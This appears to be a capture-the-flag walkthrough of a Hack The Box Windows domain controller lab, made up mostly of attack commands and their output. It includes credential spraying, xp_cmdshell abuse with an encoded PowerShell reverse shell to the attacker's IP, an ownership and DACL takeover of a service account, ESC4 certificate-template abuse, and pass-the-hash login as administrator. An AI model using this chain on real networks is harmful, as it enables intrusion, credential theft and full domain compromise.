# Page 1

We run nxc to get the name of the machine

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb escape.htb
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
```

Nmap scan

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sC -T4 escape.htb 
Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-09-30 21:34 EDT
Nmap scan report for escape.htb (10.10.11.51)
Host is up (0.12s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:34:57
|_Not valid after:  2124-06-08T17:00:40
|_ssl-date: 2025-09-30T18:36:35+00:00; -6h58m02s from scanner time.
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
|_ssl-date: 2025-09-30T18:36:13+00:00; -6h58m04s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:34:57
|_Not valid after:  2124-06-08T17:00:40
1433/tcp open  ms-sql-s
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-09-30T18:36:16+00:00; -6h58m04s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-09-30T18:30:58
|_Not valid after:  2055-09-30T18:30:58
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
|_ssl-date: 2025-09-30T18:36:13+00:00; -6h58m04s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.sequel.htb, DNS:sequel.htb, DNS:SEQUEL
| Not valid before: 2025-06-26T11:34:57
|_Not valid after:  2124-06-08T17:00:40
5985/tcp open  wsman
```

We grab the users

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc ldap dc01.sequel.htb -u 'rose' -p 'KxEPkKe6R8su' --users                
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.51     389    DC01             [+] sequel.htb\\rose:KxEPkKe6R8su 
LDAP        10.10.11.51     389    DC01             [*] Enumerated 9 domain users: sequel.htb
LDAP        10.10.11.51     389    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
LDAP        10.10.11.51     389    DC01             Administrator                 2024-06-08 16:32:20 0       Built-in account for administering the computer/domain      
LDAP        10.10.11.51     389    DC01             Guest                         2024-12-25 14:44:53 1       Built-in account for guest access to the computer/domain    
LDAP        10.10.11.51     389    DC01             krbtgt                        2024-06-08 16:40:23 1       Key Distribution Center Service Account                     
LDAP        10.10.11.51     389    DC01             michael                       2024-06-08 16:47:37 1                                                                   
LDAP        10.10.11.51     389    DC01             ryan                          2024-06-08 16:55:45 0                                                                   
LDAP        10.10.11.51     389    DC01             oscar                         2024-06-08 16:56:36 2                                                                   
LDAP        10.10.11.51     389    DC01             sql_svc                       2024-06-09 07:58:42 0                                                                   
LDAP        10.10.11.51     389    DC01             rose                          2024-12-25 14:44:54 0                                                                   
LDAP        10.10.11.51     389    DC01             ca_svc                        2025-09-30 19:02:28 0
```

List SMB shares

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb escape.htb -u 'rose' -p 'KxEPkKe6R8su' --shares 
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ            
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.11.51     445    DC01             Users           READ
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ smbclient \\\\\\\\dc01.escape.htb\\\\Users -U 'rose%KxEPkKe6R8su'
Try "help" to get a list of possible commands.
smb: \\> ls 
  .                                  DR        0  Sun Jun  9 09:42:11 2024
  ..                                 DR        0  Sun Jun  9 09:42:11 2024
  Default                           DHR        0  Sun Jun  9 07:17:29 2024
  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018

                6367231 blocks of size 4096. 890308 blocks available
```

We get the file for bloodhound

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc ldap dc01.sequel.htb -u 'rose' -p 'KxEPkKe6R8su' --bloodhound --collection All --dns-server 10.10.11.51 
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.51     389    DC01             [+] sequel.htb\\rose:KxEPkKe6R8su 
LDAP        10.10.11.51     389    DC01             Resolved collection methods: group, dcom, rdp, objectprops, psremote, session, trusts, container, acl, localadmin
LDAP        10.10.11.51     389    DC01             Done in 00M 28S
LDAP        10.10.11.51     389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.10.11.51_2025-09-30_144758_bloodhound.zip
```

We try to look at the bloodhound graph, but our user Rose does not have anything interesting related to her

Looking back at SMB, we missed the Accounting departement share. Inside, we find accounts and passwords

```bash
First Name 	Last Name 	Email 	Username 	Password
Angela 	Martin 	angela@sequel.htb 	angela 	0fwz7Q4mSpurIt99
Oscar 	Martinez 	oscar@sequel.htb 	oscar 	86LxLBMgEWaKUnBG
Kevin 	Malone 	kevin@sequel.htb 	kevin 	Md9Wlq1E5bZnVDVo
NULL 	NULL 	sa@sequel.htb 	sa 	MSSQLP@ssw0rd!
```

We spray them

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb dc01.sequel.htb -u users -p pass --continue-on-success
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [-] sequel.htb\\Administrator:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\\Guest:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\\krbtgt:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\\michael:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\\ryan:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\\oscar:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\\sql_svc:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\\rose:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\\ca_svc:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\\Administrator:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\\Guest:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\\krbtgt:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\\michael:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\\ryan:86LxLBMgEWaKUnBG STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [+] sequel.htb\\oscar:86LxLBMgEWaKUnBG
```

oscar:86LxLBMgEWaKUnBG

We look at bloodhound, but nothing is interesting for this user

We try to connect to MSSQL with the credentials for the sa user

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ impacket-mssqlclient SEQUEL/sa:'MSSQLP@ssw0rd!'@10.10.11.51              
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)> help 
```

We can use this account to enable commend execution

```bash
SQL (sa  dbo@master)> enable_xp_cmdshell
INFO(DC01\\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01\\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> RECONFIGURE
```

We use this RCE to get a shell on the machine

```bash
SQL (sa  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

In the C: directory, we find a SQL folder. We find a config file containing a password

```bash
PS C:\\SQL2019\\ExpressAdv_ENU> type sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
PS C:\\SQL2019\\ExpressAdv_ENU>
```

With the found password, we try a spray attack

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb dc01.sequel.htb -u users -p 'WqSZAF6CysDQbGb3' --continue-on-success
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [-] sequel.htb\\Administrator:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\\Guest:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\\krbtgt:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\\michael:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [+] sequel.htb\\ryan:WqSZAF6CysDQbGb3 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\\oscar:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [+] sequel.htb\\sql_svc:WqSZAF6CysDQbGb3 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\\rose:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\\ca_svc:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE
```

ryan:WqSZAF6CysDQbGb3

sql\_svc:WqSZAF6CysDQbGb3

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FPvcJdakwjKbh0ZgkEPib%2Fimage.png?alt=media&#x26;token=2850ee27-5b4e-4f0a-9762-7b38a17fc908" alt=""><figcaption></figcaption></figure>

Ryan is part of Remote Management group so we use evil-winrm to login as him

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ evil-winrm -i dc01.sequel.htb -u 'ryan' -p 'WqSZAF6CysDQbGb3'                 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: <https://github.com/Hackplayers/evil-winrm#Remote-path-completion>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\\Users\\ryan\\Documents> ls ..\\Desktop

    Directory: C:\\Users\\ryan\\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/30/2025  11:30 AM             34 user.txt
```

Ryan also has write owner of ca\_svc. We can use this to take ownership of the account and grand ourself GenericAll, so we can change the account password

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FSYJskBgpz5XUwVL4dKgs%2Fimage.png?alt=media&#x26;token=d0badd26-aefa-42b4-b0d8-00ce18038e58" alt=""><figcaption></figcaption></figure>

We change the owner for ryan

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'SEQUEL'/'ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51
[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!
```

Then we give ryan GenericAll to ca\_svc

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'SEQUEL'/'ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51

[*] DACL backed up to dacledit-20250930-155356.bak
[*] DACL modified successfully!
```

Finally we change the password for ca\_svc

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ bloodyAD --host 10.10.11.51 -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' set password ca_svc 'Hacked123!'
[+] Password changed successfully!
```

Test the new password

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb dc01.sequel.htb -u 'ca_svc' -p 'Hacked123!'                     
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\\ca_svc:Hacked123!
```

We use certipy to look at vulneable templates

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ certipy-ad find -u 'ca_svc' -p 'Hacked123!' -dc-ip 10.10.11.51 -stdout -enabled -vulnerable 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sequel-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'sequel-DC01-CA'
[*] Checking web enrollment for CA 'sequel-DC01-CA' @ 'DC01.sequel.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\\Administrators
                                          SEQUEL.HTB\\Domain Admins
                                          SEQUEL.HTB\\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\\Administrators
                                          SEQUEL.HTB\\Domain Admins
                                          SEQUEL.HTB\\Enterprise Admins
        Enroll                          : SEQUEL.HTB\\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireCommonName
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-09-30T19:55:28+00:00
    Template Last Modified              : 2025-09-30T19:55:28+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\\Domain Admins
                                          SEQUEL.HTB\\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\\Domain Admins
                                          SEQUEL.HTB\\Enterprise Admins
                                          SEQUEL.HTB\\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\\Domain Admins
                                          SEQUEL.HTB\\Enterprise Admins
                                          SEQUEL.HTB\\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\\Domain Admins
                                          SEQUEL.HTB\\Enterprise Admins
                                          SEQUEL.HTB\\Cert Publishers
        Write Property Enroll           : SEQUEL.HTB\\Domain Admins
                                          SEQUEL.HTB\\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\\Cert Publishers
    [+] User ACL Principals             : SEQUEL.HTB\\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
```

One template is vulnerable to ESC4 ⇒ we exploit it

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ certipy-ad template -u ca_svc@sequel.htb -p 'Hacked123!' -template DunderMifflinAuthentication -write-default-configuration -no-save 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: SEQUEL.HTB.
[!] Use -debug to print a stacktrace
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\\x01\\x00\\x04\\x9c0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x14\\x00\\x00\\x00\\x02\\x00\\x1c\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x14\\x00\\xff\\x01\\x0f\\x00\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x05\\x0b\\x00\\x00\\x00\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x05\\x0b\\x00\\x00\\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\\x86\\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\\x00@9\\x87.\\xe1\\xfe\\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'DunderMifflinAuthentication'? (y/N): y
[*] Successfully updated 'DunderMifflinAuthentication'
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ certipy-ad req -u ca_svc@sequel.htb -p 'Hacked123!' -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: SEQUEL.HTB.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.51 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

We can then use this hash to authenticate as the admin user

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ evil-winrm -i dc01.sequel.htb -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: <https://github.com/Hackplayers/evil-winrm#Remote-path-completion>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> ls ..\\Desktop

    Directory: C:\\Users\\Administrator\\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/30/2025  11:30 AM             34 root.txt
```
